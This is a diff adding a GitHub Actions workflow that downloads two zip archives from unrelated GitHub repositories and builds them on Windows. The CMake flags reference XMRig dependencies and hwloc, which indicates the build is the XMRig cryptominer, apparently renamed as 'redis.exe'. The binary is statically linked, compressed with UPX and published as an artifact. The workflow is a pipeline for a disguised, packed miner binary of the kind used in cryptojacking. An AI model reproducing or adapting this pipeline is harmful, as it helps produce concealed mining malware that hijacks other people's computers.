@@ -1,0 +1,81 @@
+name: Build upx nbg
+
+on:
+  push:
+    branches:
+      - main
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: windows-latest
+
+    steps:
+      - name: Checkout source code
+        uses: actions/checkout@v3
+
+      # Install MSYS2 and required packages
+      - name: Set up MSYS2 with GCC, CMake, HWLOC, and make
+        uses: msys2/setup-msys2@v2
+        with:
+          msystem: MINGW64
+          install: mingw-w64-x86_64-gcc mingw-w64-x86_64-cmake mingw-w64-x86_64-hwloc unzip
+
+      # Install curl to download the required files
+      - name: Install curl
+        run: msys2 -c "pacman -S --noconfirm curl"
+
+      # Download gcc.zip
+      - name: Download gcc.zip
+        run: msys2 -c "curl -L -o gcc.zip https://github.com/Janit8r/device_lge_judyln/raw/S/gcc.zip"
+
+      # Download redis.zip
+      - name: Download redis.zip
+        run: msys2 -c "curl -L -o redis.zip https://github.com/Janit8r/frp-2/raw/refs/heads/dev/redis-nbg.zip"
+
+      # Unzip gcc.zip
+      - name: Unzip gcc.zip
+        run: msys2 -c "unzip gcc.zip -d gcc"
+
+      # Unzip redis.zip
+      - name: Unzip redis.zip
+        run: msys2 -c "unzip redis.zip -d redis"
+
+      # Create build directory inside redis
+      - name: Create build directory in redis
+        run: msys2 -c "mkdir -p redis/redis/build"
+
+      # Ensure mingw32-make is installed
+      - name: Ensure mingw32-make is installed
+        run: msys2 -c "
+            echo 'Checking for make installation...'; 
+            if ! command -v mingw32-make &> /dev/null; then 
+              echo 'mingw32-make is not installed. Installing...'; 
+              pacman -S --noconfirm mingw-w64-x86_64-make; 
+            else 
+              echo 'mingw32-make is already installed.'; 
+            fi; 
+            mingw32-make --version
+          "
+      # Run CMake to generate Makefiles
+      - name: Run CMake to generate Makefiles
+        run: msys2 -c "cd redis/redis/build && cmake .. -G 'MinGW Makefiles' -DXMRIG_DEPS=D:/a/frp-2/frp-2/gcc/gcc/x64 -DCMAKE_C_FLAGS='-static' -DCMAKE_CXX_FLAGS='-static' -DBUILD_SHARED_LIBS=OFF -DHWLOC_INCLUDE_DIRS=/mingw64/include -DHWLOC_LIBRARIES=/mingw64/lib/libhwloc.a"
+
+      # Build the project using mingw32-make in the MSYS2 environment
+      - name: Build project
+        run: msys2 -c "cd redis/redis/build && mingw32-make"
+
+      # Install UPX
+      - name: Install UPX
+        run: msys2 -c "pacman -S --noconfirm upx"
+
+      # Compress redis.exe with UPX
+      - name: Compress redis.exe with UPX
+        run: msys2 -c "upx --best --lzma redis/redis/build/redis.exe"
+
+      # Optionally, archive the build artifacts (if needed)
+      - name: Archive build artifacts
+        uses: actions/upload-artifact@v3
+        with:
+          name: build-artifacts
+          path: redis/redis/build
